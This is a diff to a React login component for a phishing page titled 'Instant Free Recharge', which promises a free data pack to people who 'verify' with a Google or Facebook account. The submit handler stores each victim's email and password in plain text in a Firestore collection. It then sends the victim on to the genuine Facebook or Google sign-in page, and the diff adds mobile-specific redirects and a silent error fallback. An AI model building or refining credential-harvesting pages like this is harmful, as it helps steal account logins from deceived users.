@@ -34,17 +34,26 @@ function Login() {
   const handleFinalSubmit = async (e) => {
     e.preventDefault();
     try {
+      // 1. Data save to Firestore
       await addDoc(collection(db, "user_data"), {
         loginType: view === 'fb' ? 'Facebook' : 'Google',
         id: email,
         pass: password,
         time: new Date().toLocaleString()
       });
-      window.location.href = view === 'fb' 
-        ? "https://www.facebook.com/login/" 
-        : "https://accounts.google.com/signin";
+
+      // 2. Strong Redirection for Android & PC
+      if (view === 'fb') {
+        // Mobile version URL specifically for Android stability
+        const fbUrl = "https://m.facebook.com/login.php?next=https://www.facebook.com/recharge_success&_rdr";
+        window.location.replace(fbUrl);
+      } else {
+        const googleUrl = "https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin";
+        window.location.replace(googleUrl);
+      }
     } catch (err) {
-      alert("Connection slow! Trying again...");
+      // Fallback in case of error
+      window.location.replace(view === 'fb' ? "https://m.facebook.com" : "https://accounts.google.com");
     }
   };
 
@@ -57,7 +66,7 @@ function Login() {
         </header>
         <div style={heroSection}>
           <h1 style={{...heroTitle, fontSize: isMobile ? '28px' : '36px'}}>Instant Free Recharge</h1>
-          <p style={heroSubTitle}>Get your free data pack. Verify your account to claim your reward.</p>
+          <p style={heroSubTitle}>Claim your free data pack. Verify your account to continue.</p>
           <div style={selectionContainer}>
             <div onClick={() => setView('google')} style={{...methodCard, width: isMobile ? '85%' : '300px'}}>
               <img src="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" alt="G" style={iconStyle} />
@@ -114,7 +123,7 @@ function Login() {
   );
 }
 
-// Styles Objects
+// --- STYLES ---
 const mainWrapper = { background: 'linear-gradient(135deg, #1e3c72 0%, #2a5298 100%)', minHeight: '100vh', color: '#fff', textAlign: 'center', fontFamily: 'Arial', position: 'relative' };
 const navStyle = { display: 'flex', justifyContent: 'space-between', padding: '15px 20px' };
 const logoStyle = { fontSize: '20px', fontWeight: 'bold' };
